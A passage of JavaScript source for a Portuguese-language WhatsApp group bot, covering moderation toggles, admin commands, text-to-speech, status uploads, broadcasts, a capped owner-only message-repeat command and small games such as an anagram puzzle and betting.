);
}
break
				 case 'anticon':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (Number(args[0]) === 1) {
						if (isCon) return reply(`O ${command} já está ativado!!!`)
						anticon.push(from)
						fs.writeFileSync('./db/anticon.json', JSON.stringify(anticon))
						reply(`❗${command} foi ativado com sucesso 🪀`)
						replyinvisiveltag(from, `❗ALERTA!!!❗\n Modo anti contato foi ativado nesse grupo\nOu seja você será banido imediatamente e automaticamente sé enviar algum contato...`, text)
					} else if (Number(args[0]) === 0) {
						if (!isCon) return reply('Já esta desativado')
						var ini = anticon.indexOf(from)
						anticon.splice(ini, 1)
						fs.writeFileSync('./db/anticon.json', JSON.stringify(anticon))
						reply(`O ${command} foi desativado com sucesso 🤔`)						
	} else if (!c) {
sendButMessage(
from,
`🚹 ANTI CONTATO 🚹`,
`Selecione abaixo`,
[
{
buttonId: `anticon 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `anticon 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
			 case 'antiloc':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (Number(args[0]) === 1) {
						if (isLoc) return reply(`O ${command} já está ativado!!!`)
						antiloc.push(from)
						fs.writeFileSync('./db/anti_db/antiloc.json', JSON.stringify(antiloc))
						reply(`❗${command} foi ativado com sucesso 🪀`)
						replyinvisiveltag(from, `❗ALERTA!!!❗\n Modo anti msg de localização foi ativado nesse grupo\nOu seja você será banido imediatamente e automaticamente sé enviar alguma localização...`, text)
					} else if (Number(args[0]) === 0) {
						if (!isLoc) return reply('Já esta desativado')
						var ini = antiloc.indexOf(from)
						antiloc.splice(ini, 1)
						fs.writeFileSync('./db/anti_db/antiloc.json', JSON.stringify(antiloc))
						reply(`O ${command} foi desativado com sucesso 🤔`)
	} else if (!c) {
sendButMessage(
from,
`👁️‍🗨️ANTI LOC 👁️‍🗨️`,
`Selecione abaixo`,
[
{
buttonId: `antiloc 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `antiloc 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
			 case 'anticat':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (Number(args[0]) === 1) {
						if (isCat) return reply(`O ${command} já está ativado!!!`)
						anticat.push(from)
						fs.writeFileSync('./db/anti_db/anticat.json', JSON.stringify(anticat))
						reply(`❗${command} foi ativado com sucesso 🪀`)
						replyinvisiveltag(from, `❗ALERTA!!!❗\n Modo anti catálogo foi ativado nesse grupo\nOu seja você será banido imediatamente e automaticamente sé enviar algum documento...`, text)
					} else if (Number(args[0]) === 0) {
						if (!isCat) return reply('Já esta desativado')
						var ini = anticat.indexOf(from)
						anticat.splice(ini, 1)
						fs.writeFileSync('./db/anti_db/anticat.json', JSON.stringify(anticat))
						reply(`O ${command} foi desativado com sucesso 🤔`)
	} else if (!c) {
sendButMessage(
from,
`♨️ ANTI CATÁLOGO ♨️`,
`Selecione abaixo`,
[
{
buttonId: `anticat 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `anticat 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
				 case 'antidoc':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (Number(args[0]) === 1) {
						if (isDoc) return reply(`O ${command} já está ativado!!!`)
						antidoc.push(from)
						fs.writeFileSync('./db/anti_db/antidoc.json', JSON.stringify(antidoc))
						reply(`❗${command} foi ativado com sucesso 🪀`)
						replyinvisiveltag(from, `❗ALERTA!!!❗\n Modo anti documento foi ativado nesse grupo\nOu seja você será banido imediatamente e automaticamente sé enviar algum documento...`, text)
					} else if (Number(args[0]) === 0) {
						if (!isDoc) return reply('Já esta desativado')
						var ini = antidoc.indexOf(from)
						antidoc.splice(ini, 1)
						fs.writeFileSync('./db/anti_db/antidoc.json', JSON.stringify(antidoc))
						reply(`O ${command} foi desativado com sucesso 🤔`)
						replyinvisiveltag(from, `*Podem enviar links avontade fml 😂*`, text)
	} else if (!c) {
sendButMessage(
from,
`📄ANTI DOC 📄`,
`Selecione abaixo`,
[
{
buttonId: `antidoc 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `antidoc 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
case "antiviewonce":
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args[0] == "on") {
if (isAntiVO) return reply("Já está ativado!!");
antiviewonce.push(from);
fs.writeFileSync("./db/anti_db/antiviewonce.json", JSON.stringify(antiviewonce));
reply("Anti visualização unica foi ativado neste grupo!");
} else if (args[0] == "off") {
let akuu = antivo.indexOf(from)
if (! isAntiVO) return reply('Já está desativado')
antiviewonce.splice(akuu, 1)
fs.writeFileSync("./db/anti_db/antiviewonce.json", JSON.stringify(antiviewonce));
reply("Anti visualização unica foi desativado neste grupo!");
} else if (!c) {
sendButMessage(
from,
`👁️MODO ANTI VISUALIZAÇÃO UNICA 👀`,
`Selecione abaixo`,
[
{
buttonId: `antiviewonce on`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `antiviewonce off`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break;
case 'nsfw':
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins) return reply(mess.admin)
//if (!isOwner) return reply(ptbr.ownerB())

if (Number(args[0]) === 1) {
if (isNsfw) return reply('❎o NSFW já está ativo no grupo❎')
nsfw.push(from)
fs.writeFileSync('./db/grupo_db/nsfw.json', JSON.stringify(nsfw))
reply('O adm liberou o porno 😳')
} else if (Number(args[0]) === 0) {
nsfw.splice(from, 1)
fs.writeFileSync('./db/grupo_db/nsfw.json', JSON.stringify(nsfw))
reply('O corno do adm proibiu o porno 😡')
	} else if (!c) {
sendButMessage(
from,
`\`\`\`MODO +18\`\`\``,
`Selecione abaixo`,
[
{
buttonId: `nsfw 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `nsfw 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break

			 case 'antifake':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (Number(args[0]) === 1) {
						if (isAntiFake) return reply(`O ${command} já está ativado!!!`)
						antifake.push(from)
						fs.writeFileSync('./db/anti_db/antifake.json', JSON.stringify(antifake))
						reply(`❗${command} foi ativado com sucesso 🪀`)
					} else if (Number(args[0]) === 0) {
						if (!isAntiFake) return reply('Já esta desativado')
						var ini = antifake.indexOf(from)
						antifake.splice(ini, 1)
						fs.writeFileSync('./db/anti_db/antifake.json', JSON.stringify(antifake))
						reply(`O ${command} foi desativado com sucesso 🤔`)
	} else if (!c) {
sendButMessage(
from,
`❗ANTI NÚMEROS FAKE 💢`,
`Selecione abaixo`,
[
{
buttonId: `antifake 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `antifake 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
			 case 'welcome':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply(`O ${command} já está ativado!!!`)
						welkom.push(from)
						fs.writeFileSync('./db/grupo_db/welkom.json', JSON.stringify(welkom))
						reply(`❗${command} foi ativado com sucesso 🪀`)
					} else if (Number(args[0]) === 0) {
						if (!isWelkom) return reply('Já esta desativado')
						var ini = welkom.indexOf(from)
						welkom.splice(ini, 1)
						fs.writeFileSync('./db/grupo_db/welkom.json', JSON.stringify(welkom))
						reply(`O ${command} foi desativado com sucesso 🤔`)
	} else if (!c) {
sendButMessage(
from,
`❗MODO BOAS VINDAS 💢`,
`Selecione abaixo`,
[
{
buttonId: `welcome 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `welcome 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
					case 'antibug':
          if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
          if (args[0] === '1') {
          bugc = true
          reply(`${command} foi ativado com sucesso`)
          replyinvisiveltag(`❗ALERTA💢\nAnti bug foi ativado Qualquer um engraçadinho que enviar o bug será banido 😒`)
          } else if (args[0] === '0') {
          bugc = false
          reply(`${command} foi desativado com sucesso`)
	} else if (!c) {
sendButMessage(
from,
`‼️ANTI BUG‼️`,
`Selecione abaixo`,
[
{
buttonId: `antibug 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `antibug 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
				case 'tinyurl':
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'sharelock':
case 'localização':
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
edward.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: pperfil}, MessageType.liveLocation, {quoted:floc})
break
case 'tts':
					  try{
        if (args.length > 1) {
        const gtts = require('./funções/gtts')(args[0])
        if (args.length < 2) return edward.sendMessage(from, 'Cadê o texto?', text, {quoted: mek})
        ngab = budy.slice(7)
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        ngab.length > 600
        ? reply('O texto e muito grande mn, coloque um com menos caracteres 🙏🏻')
        : gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -filter:a "atempo=0.7,asetrate=42100" ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply('Puts deu erro :(')
                edward.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	} else if ( args.length === 1 ){
		ngab = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
		const gtts = require('./funções/gtts')(args[0])
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply(mess.error.api)
                edward.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	}
} catch (e){
	reply(mess.error.api)
}
break
case 'testvoz':
try{
if (command) {
ngab = `Olá ${pushname}`
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        ngab.length > 600
        ? reply('O texto e muito grande mn, coloque um com menos caracteres 🙏🏻')
        : gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -filter:a "atempo=0.7,asetrate=42100" ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply('Puts deu erro :(')
                edward.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	} else if ( args.length === 1 ){
		ngab = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
		const gtts = require('./funções/gtts')(args[0])
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply(mess.error.api)
                edward.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	}
} catch (e){
	reply(mess.error.api)
}
break
				case 'demote':
				case 'rebaixar':
				case 'despromover':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
     if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a msg da pessoa!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    edward.groupDemoteAdmin(from, [demote])
						reply(`Removido com sucesso o adm do ${demote}`)
						break
					case 'promote':
					case 'promover':
					case 'daradm':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
     if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a msg da pessoa!')
			promote = mek.message.extendedTextMessage.contextInfo.participant
		    edward.groupMakeAdmin(from, [promote])
						reply(`O ${promote} foi promovido a adm com sucesso`)
						break
				case 'gplink':
				case 'linkgrupo':
				case 'linkgp':
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await edward.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink do grupo ${groupName}`
					edward.sendMessage(from, yeh, text, { quoted: mek })
					break
					case 'resetlinkgp':
         case 'redefinirlinkgp':
         case 'redefinirlink':
         if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
          json = ['action', 'inviteReset', from]
         edward.query({json, expect200: true})
          reply(`O link do grupo ${from} foi redefinido com sucesso`)
         break
					case 'opengp':
					case 'abrirgp':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                   reply(`Sucesso ao abrir o grupo: ${groupName}`)
						edward.groupSettingChange(from, GroupSettingChange.messageSend, false)
						break
						case 'closegc':
						case 'fechargp':
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
						reply(`Sucesso ao fechar o grupo: ${groupName}`)
						edward.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break
case 'gp':
 if (!isGroup) return reply(mess.only.group)
	if (!isGroupAdmins) return reply(mess.only.admin)
	if (!isBotGroupAdmins) return reply(mess.only.Badmin)
sendButMessage(
from,
`🔒ABRIR/FECHAR O GRUPO🔓`,
`Selecione abaixo`,
[
{
buttonId: `abrirgp`,
buttonText: {
displayText: `🔓 ABRIR`,
},
type: 1,
},
{
buttonId: `fechargp`,
buttonText: {
displayText: `🔒 FECHAR`,
},
type: 1,
},
]
);
break					
				case 'spam':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!arg) return reply(`Use assim ${prefix + command} msg|quantidade`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Use assim ${prefix + command} msg|quantidade`)
				if (Number(argzi[1]) >= 50) return reply('O limite é 50, não abuse 😠!!')
				if (isNaN(argzi[1])) return reply(`Coloque a quantidade em formato de número...!`)
				for (let i = 0; i < argzi[1]; i++){
					edward.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
				case 'despromoverall':
				case 'rebaixarall':
				case 'rebaixartodos':
				case 'despromovertodos':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                edward.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
                case 'promoverall':
                case 'promovertodos':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                edward.groupMakeAdmin(from, members_id)
                break
				case 'setnamegp':				
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					edward.groupUpdateSubject(from, `${body.slice(11)}`)
					reply(`Sucesso em alterar o nome do grupo para: ${body.slice(11)}`)
					break					
				case 'setdeskgp':
				case 'setdescgp':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					edward.groupUpdateDescription(from, `${body.slice(10)}`)
					reply(`Sucesso ao alterar a descrição do gp para: ${body.slice(10)}`)
					break
				case 'setprofile':
				case 'setpp':
				edward.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Marque alguma imagem!')
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await edward.downloadAndSaveMediaMessage(enmediau)
					await edward.updateProfilePicture(botNumber, mediau)
					reply('Feito 👍')
					break
				case 'leave':
				case 'sair':
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				edward.updatePresence(from, Presence.composing)
				edward.groupLeave(from)
						break
				case 'bc':
				case 'tm':
					edward.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Cadê o texto?')
					anu = await edward.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							edward.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`,quoted:tm})
						}
						reply(`A tm foi feita com sucesso\n _*${body.slice(4)}*_`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							edward.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`A tm foi feita com sucesso\n _*${body.slice(4)}*_`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							edward.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: tm, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`A tm foi feita com sucesso\n _*${body.slice(4)}*_`)
					} else {
						for (let _ of anu) {
						sendButMessage(_.jid, `${body.slice(4)}`, "*⁉️ Bot Transmissão 🗣️*", [{buttonId: 'igm', buttonText: {displayText: '📱INSTAGRAM 📱'}, type: 1},{buttonId: 'gpofc', buttonText: {displayText: 'GRUPO OFC 📞'}, type: 1},{buttonId: 'ping', buttonText: {displayText: '🏓 PING 🏓'}, type: 1}], {quoted:tm, contextInfo: { "mentionedJid": _.jid }})
						}
						reply(`A tm foi feita com sucesso\n _*${body.slice(4)}*_`)
					}
					break
					case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!arg) return reply(`Use assim: ${prefix + command} txt|quantidade`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Use assim: ${prefix + command} txt|quantidade`)
				if (Number(argzi[1]) >= 50) return reply('O limite é 50, não abuse 😠!')
				if (isNaN(argzi[1])) return reply(`Coloque a quantidade em formato de número...!`)
				for (let i = 0; i < argzi[1]; i++){
					edward.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				case 'upswteks':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Cadê o texto?')
                    teks = body.slice(10)
                    edward.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Texto enviado para os status com sucesso:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  if (args.length < 1) return reply('Cadê o texto?')
                    teks = body.slice(12)
                    edward.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NomeBot}`}, MessageType.location)
                    reply(`Localização enviada para os status com sucesso:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply('Marque a  Figurinha!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)
						edward.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Figurinha enviada para os status com sucesso`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Marque o audio!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)
						edward.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Áudio enviado para os status com sucesso`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Marque o audio!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)
						edward.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Voice enviado para os status com sucesso`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await edward.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    edward.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Vídeo enviado para os status com sucesso:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await edward.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    edward.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Gif enviado para os status com sucesso:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await edward.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    edward.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Imagem enviada para os status com sucesso:\n${teksyy}`)
                        break
					case 'shutdown':
					case 'desligar':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				return edward.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Desligado com sucesso 😔')
				break
				case 'tomp4':
					if (!isQuotedSticker) return reply('Marque a figurinha')
             reply(mess.wait)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await edward.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Marque a figurinha!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
					edward.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Marque algum vídeo')
					reply(mess.wait)
					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await edward.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						edward.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
				case 'ppt':
  if (args.length < 1) return reply('Escolha: tesoura/pedra/papel')
					if (args[0] === 'tesoura' ) {
					  gunting = [
					    `${pushname}: *${args[0]}*\n${NomeBot}: *papel*\nVocê ganhou 😔`,
					    `${pushname}: *${args[0]}*\n${NomeBot} *pedra*\nVocê perdeu 🙂`,
					    `${pushname}: *${args[0]}*\n${NomeBot} *tesoura*\nNos empatamos 😏`
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'papel') {
					  ker = [
					    `${pushname}: *${args[0]}*\n${NomeBot} *pedra*\nVocê ganhou 😔`,
					    `${pushname}: *${args[0]}*\n${NomeBot} *tesoura*\nVocê perdeu 🙂`,
					    `${pushname}: *${args[0]}*\n${NomeBot}: *papel*\nNos empatamos 😏`
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'pedra') {
					  bat = [
					    `${pushname}: *${args[0]}*\n${NomeBot} *tesoura*\nVocê ganhou 😔`,
					    `${pushname}: *${args[0]}*\n${NomeBot}: *papel*\nVocê perdeu 🙂`,
					    `${pushname}: *${args[0]}*\n${NomeBot} *pedra*\nNos empatamos 😏`
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Escolha: tesoura/pedra/papel')
					}
break
case 'anagrama':
						if(!isGroup) return reply('comando apenas para grupos')
					const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
					if(!isGroupAdmins) return reply('comando apenas para admins')
						if (args.join(' ') === 'ativar') {
							if(fs.existsSync(`./db/cachê/anagrama/anagrama-${from}.json`)) {
							let dataAnagrama2 = JSON.parse(fs.readFileSync(`./db/cachê/anagrama/anagrama-${from}.json`))
							reply(`o jogo já foi iniciado neste grupo:
				palavra: ${dataAnagrama2.embaralhada}
				dica: ${dataAnagrama2.dica}
				`)} else {
					fs.writeFileSync(`./db/cachê/anagrama/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
					edward.sendMessage(from, `
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
│➽ DICA: ${palavrasANA[anaaleatorio].dica}
╰────────────────────────
				`,MessageType.text)
				}
						} else if (args.join(' ') ==='desativar') {
						if(!fs.existsSync(`./db/cachê/anagrama/anagrama-${from}.json`)) return reply('não tem como desativar o jogo do anagrama pôs ele não foi ativado')
				fs.unlinkSync(`./db/cachê/anagrama/anagrama-${from}.json`)
				reply("desativado com sucesso")
            	} else if (!c) {
sendButMessage(
from,
`🎮 ANAGRAMA 🔮️`,
`Selecione abaixo`,
[
{
buttonId: `anagrama ativar`,
buttonText: {
displayText: `✅ ATIVAR`,
},
type: 1,
},
{
buttonId: `anagrama desativar`,
buttonText: {
displayText: `❌ DESATIVAR`,
},
type: 1,
},
]
);
}
					break 

case 'apostar':
           if (!isGroup) return reply(`SOMENTE EM GRUPOS`)
		   const dinheiro = verificar_dinheiro(sender)
		   const checkxpr = verificar_dinheiro(sender, dinheiro)
		   const quantidader = `1000`
			if (checkxpr <= quantidader) return reply(`Você não possui licença para jogar, obtenha uma quando tiver ${quantidader} de dinheiro.\n\nSeu dinheiro: ${checkxpr}`)
			if (args.length !== 1) return reply('Especifique a quantidade de dinheiro para apostar.')
			if (Number(args[0]) >= checkxpr || Number(args[0]) >= dinheiro) return reply(`Você não pode apostar uma quantidade de dinheiro maior do que a você tem, e nosso limite de apostas é de ${quantidader} dinheiro por vez!\n\nSeu dinheiro: ${checkxpr}`)
			if (Number(args[0]) < 100) return reply(`O minimo para se apostar é de 100 dinheiro`)
			if (isNaN(args[0])) return reply('Para apostar use apenas números, nada de inserir letras, a menos que queira perder todo o XP que tenha.')
		    const double = Math.floor(Math.random() * 2) + 1
			const nrolxp = Number(-args[0])
			const prolxp = double + Number(args[0])
           if (double == 1) {
